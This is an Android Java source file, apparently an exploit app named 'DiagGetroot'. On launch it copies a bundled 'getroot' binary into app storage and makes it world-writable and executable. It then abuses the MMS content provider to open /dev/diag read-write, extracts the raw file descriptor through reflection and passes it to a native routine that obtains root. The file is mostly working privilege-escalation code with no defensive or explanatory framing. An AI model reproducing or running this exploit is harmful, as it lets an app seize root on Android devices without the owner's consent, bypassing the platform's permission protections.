package c.fyf;

import java.io.FileDescriptor;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;

import c.fyf.R;

import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.app.Activity;
import android.content.ContentValues;
import android.content.res.AssetManager;
import android.util.Log;

public class MainActivity extends Activity {
	private void copyAssets() {
	    AssetManager assetManager = getAssets();
	    String[] files = null;
	    try {
	        files = assetManager.list("");
	    } catch (IOException e) {
	        Log.e("tag", "Failed to get asset file list.", e);
	    }
	    for(String filename : files) {
	        InputStream in = null;
	        OutputStream out = null;
	        try {
	          in = assetManager.open("getroot");
	          out = new FileOutputStream("/data/data/c.fyf/" + "getroot");
	          copyFile(in, out);
	          in.close();
	          in = null;
	          out.flush();
	          out.close();
	          out = null;
	        } catch(IOException e) {
	            Log.e("tag", "Failed to copy asset file: " + filename, e);
	        }       
	    }
	}
	private void copyFile(InputStream in, OutputStream out) throws IOException {
	    byte[] buffer = new byte[1024];
	    int read;
	    while((read = in.read(buffer)) != -1){
	      out.write(buffer, 0, read);
	    }
	}
	
	private void setperms() throws IOException{
	Runtime.getRuntime().exec("chmod 777 /data/data/c.fyf/getroot");
	}
	
	final static String TAG = "##DiagGetroot##";
	static {
		System.loadLibrary("diaggetrootjni");
	}
	native void getrootnative(int fd);
	
	private void useMMS() { //phone
        Uri uri = Uri.parse("content://mms/0/part");
        try {
        	ContentValues values2 = new ContentValues();
        	Uri uri2 = getContentResolver().insert(uri, values2);
        	if(uri2 != null)
        		Log.d(TAG, "" + uri2);
        	ContentValues values = new ContentValues();
           	values.put("_data", "/dev/diag");
        	getContentResolver().update(uri2, values, null, null);
        	ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(uri2, "rw");
        	Log.d(TAG, "Pfd=" + pfd);
        	pfd.getFileDescriptor();
        	FileDescriptor fd = pfd.getFileDescriptor();
        	Field fld = fd.getClass().getDeclaredField("descriptor");
        	fld.setAccessible(true);
        	int fint;
			fint = fld.getInt(fd);
			Log.d(TAG, "fint=" + fint);
			getrootnative(fint);
        }catch(Exception e){
        	e.printStackTrace();
        }
	}
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        copyAssets();
        try {
			setperms();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
        useMMS();
    }
}
